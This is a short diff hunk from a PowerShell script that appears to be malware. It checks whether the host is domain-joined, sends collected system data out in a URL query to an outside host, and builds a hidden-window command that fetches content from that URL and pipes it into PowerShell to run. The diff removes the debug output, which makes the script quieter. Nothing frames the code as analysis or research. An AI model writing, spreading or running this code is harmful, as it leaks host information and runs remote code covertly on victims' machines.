@@ -8,8 +8,6 @@ if ($computerInfo.CsPartOfDomain)
     $url = "http://www.baidu.com/?q="+$fullString  
     try {  
         $response = Invoke-WebRequest -Uri $url -Method Get -UseBasicParsing  
-        Write-Host "URL: $url"  
-        Write-Host "$($response.StatusCode)"  
     } catch { 
     }  
     $ccc = '"Powershell -WindowStyle Hidden irm '  + $url +'|Powershell"'
